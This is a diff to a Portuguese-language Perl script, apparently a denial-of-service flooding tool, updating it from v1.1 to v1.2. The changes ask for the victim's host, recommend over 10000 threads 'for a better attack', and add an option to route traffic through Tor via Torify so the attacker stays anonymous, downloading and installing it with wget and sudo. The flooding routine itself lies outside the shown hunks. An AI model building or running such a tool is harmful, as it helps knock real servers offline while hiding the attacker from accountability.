@@ -14,6 +14,13 @@
 # Página no Facebook do Inurl Brasil -> facebook.com/InurlBrasil
 # Blog Inurl Brasil -> blog.inurl.com.br/
 #
+# ################ VERIFICAÇÃO E USO DO Torify
+# ################ TORIFY É UM PROJETO CRIADO POR ericpaulbishop QUE ENVIA TODO O TRAFEGO DA INTERNET PARA A REDE Tor USANDO IPTABLES
+# ################ ESTE PROJETO ESTA NO Github A 2 ANOS PORÉM FUNCIONA MUITO BEM!
+# ################ PARA QUEM TIVER DÚVIDAS DE QUEM SEU IP NÃO ESTA CAMUFLADO, VISTIE O SITE check.torproject.org OU USE O COMANDO "tcpdump host [IP QUE VC ESTA ATACANDO]" OU USE O Wireshark
+# ################ EU NÃO CRIEI O Torify, ENTÃO DEVO TODOS OS CRÉDITOS PELA FERRAMENTA AO ericpaulbishop PELA ÓTIMA FERRAMENTA QUE ELE CRIOU :D
+# ################ Github -> github.com/ericpaulbishop/iptables_torify
+#
 
 ############### MÓDULOS
 use warnings;
@@ -27,7 +34,7 @@ binmode(STDOUT, ":utf8"); # CODE PARA SAÍDA utf8
 system 'clear';
 
 ############### DECLARAÇÃO DE VARIAVÉIS
-my (  $OS, $baner, $termo, $threads, $vitima, $VezesDeAtaque, $i, $threadsJoin, $socket, $t );
+my (  $OS, $baner, $termo, $threads, $vitima, $torify, $VezesDeAtaque, $i, $threadsJoin, $socket, $t );
 $OS = $^O;
 
 $termo = "                                                 
@@ -46,7 +53,7 @@ $baner = "
 ##     ## ##     ## ##          ##     ##           ##    ##    ##    ##    ##  ##       ##    ## ##    ## ##       ##    ##  
 ##     ##  #######  ########    ##    ####           ######     ##    ##     ## ########  ######   ######  ######## ##     ## 
                                                                                                             
-                                                                                                                             v1.1";
+                                                                                                                             v1.2";
 ############### VERIFICAÇÃO DO SISTEMA OPERACIONAL
 if ( $OS ne 'linux' ) {
 	system "cls";
@@ -58,44 +65,6 @@ if ( $OS ne 'linux' ) {
 	exit (0);
 }
 
-################# VERIFICAÇÃO E USO DO Torify
-################# TORIFY É UM PROJETO CRIADO POR ericpaulbishop QUE ENVIA TODO O TRAFEGO DA INTERNET PARA A REDE Tor USANDO IPTABLES
-################# ESTE PROJETO ESTA NO Github A 2 ANOS PORÉM FUNCIONA MUITO BEM!
-################# PARA QUEM TIVER DÚVIDAS DE QUEM SEU IP NÃO ESTA CAMUFLADO, VISTIE O SITE check.torproject.org OU USE O COMANDO "tcpdump host [IP QUE VC ESTA ATACANDO]" OU USE O Wireshark
-################# EU NÃO CRIEI O Torify, ENTÃO DEVO TODOS OS CRÉDITOS PELA FERRAMENTA AO ericpaulbishop PELA ÓTIMA FERRAMENTA QUE ELE CRIOU :D
-################# Github -> github.com/ericpaulbishop/iptables_torify
-if ( -e "/etc/init.d/torify" ) {
-    system ("sudo /etc/init.d/torify start");
-} else {
-    print "Torify não instalado D:\n";
-    print "Instalando Torify...\n\n";
-    sleep 1;
-    system ("wget https://github.com/ericpaulbishop/iptables_torify/archive/master.zip -O ~/Downloads/torify.zip");
-    system ("sudo apt-get install unzip");
-    system ("unzip ~/Downloads/torify.zip");
-    system ("mv iptables_torify-master ~/Downloads");
-    system ("sudo sh ~/Downloads/iptables_torify-master/debian_install.sh");
-    if ( -e "/etc/init.d/torify" ) {
-        print "\n\n";
-        print "Torify instalado com sucesso :D\n";
-        print "Execute o script mais uma vez :D\n";
-        system ("sudo rm -rf ~/Downloads/iptables_torify-master");
-        system ("sudo rm -rf ~/Downloads/torify.zip");
-        exit (0);
-    } else {
-        print "\n\n";
-        print "Ouve algum problema na instalação...\n";
-        print "Verifique se contem o arquivo torify no diretório /etc/init.d/\n";
-        print "Tente executar novamente o script\n";
-        print "Os arquivos baixados estão na pasta ~/Downloads para fazer a instalação manualmente\n";
-        print "Basta você executar o 'debian_install.sh' que se encontra na pasta '~/Downloads/iptables_torify-master'\n";
-        open FILE, ">torify.txt" or die "Impossível criar arquivo torify.txt\n";
-        print FILE "https://github.com/ericpaulbishop/iptables_torify/archive/master.zip";
-        close FILE;
-        print "Se não, tente baixar o arquivo no Github no link que vai estar dentro do arquivo de texto com o nome de torify.txt\n";
-    }
-}
-
 print $baner;
 print "\n\n";
 
@@ -105,17 +74,59 @@ print "\n\n";
 ############### ENTRADA DA QUANTIDADE DE THREADS A SEREM USADAS
 info1:
 print "Digite a quantidade de threads a serem usadas.\n";
+print "Sugiro mais de 10000 threads para um melhor ataque\n";
 print "--> ";
 $threads = <STDIN>; chomp $threads;
 
 ############### ENTRADA DO URL/HOST 
-print "\n\n";
+print "\n";
 print "Digite o URL/HOST da vítima\n";
-print "Sugiro mais de 10000 threads para um melhor ataque\n";
+print "PS: Não coloque o 'http://' ou 'https://' pois vai dar erro\n";
 print "--> ";
 $vitima = <STDIN>; chomp $vitima;
-if ( $vitima !~ /www./ ) {
-	$vitima = "www.".$vitima;
+
+print "\n";
+print "Quer usar o Torify para fazer um ataque anônimo\?\n";
+print "PS: Usando o Torify não garante que você irá derrubar o server mas mantém você anônimo durante o ataque\n";
+print "Digite [S,s]im|[S,s] ou [N,n]ao|[N,n]\n";
+print "--> ";
+$torify = <STDIN>; chomp $torify;
+if ( $torify =~ /[S,s]im|[S,s]/ ) {
+    if ( -e "/etc/init.d/torify" ) {
+        system ("sudo /etc/init.d/torify start");
+    } else {
+        print "Torify não instalado D:\n";
+        print "Instalando Torify...\n\n";
+        sleep 1;
+        system ("wget https://github.com/ericpaulbishop/iptables_torify/archive/master.zip -O ~/Downloads/torify.zip");
+        system ("sudo apt-get install unzip");
+        system ("unzip ~/Downloads/torify.zip");
+        system ("mv iptables_torify-master ~/Downloads");
+        system ("sudo sh ~/Downloads/iptables_torify-master/debian_install.sh");
+        if ( -e "/etc/init.d/torify" ) {
+            print "\n\n";
+            print "Torify instalado com sucesso :D\n";
+            print "Execute o script mais uma vez :D\n";
+            system ("sudo rm -rf ~/Downloads/iptables_torify-master");
+            system ("sudo rm -rf ~/Downloads/torify.zip");
+            exit (0);
+        } else {
+            print "\n\n";
+            print "Ouve algum problema na instalação...\n";
+            print "Verifique se contem o arquivo torify no diretório /etc/init.d/\n";
+            print "Tente executar novamente o script\n";
+            print "Os arquivos baixados estão na pasta ~/Downloads para fazer a instalação manualmente\n";
+            print "Basta você executar o 'debian_install.sh' que se encontra na pasta '~/Downloads/iptables_torify-master'\n";
+            open FILE, ">torify.txt" or die "Impossível criar arquivo torify.txt\n";
+            print FILE "https://github.com/ericpaulbishop/iptables_torify/archive/master.zip";
+            close FILE;
+            print "Se não, tente baixar o arquivo no Github no link que vai estar dentro do arquivo de texto com o nome de torify.txt\n";
+        }
+    }
+
+} elsif ( $torify =~ /[N,n]ao|[N,n]/ ) {
+    print "[\!] O Torify não esta sendo usado [\!]\n";
+    sleep 1;
 }
 
 ############### CÓDIGO PARA CRIAÇÃO AUTOMÁTICA DE THREADS >=D
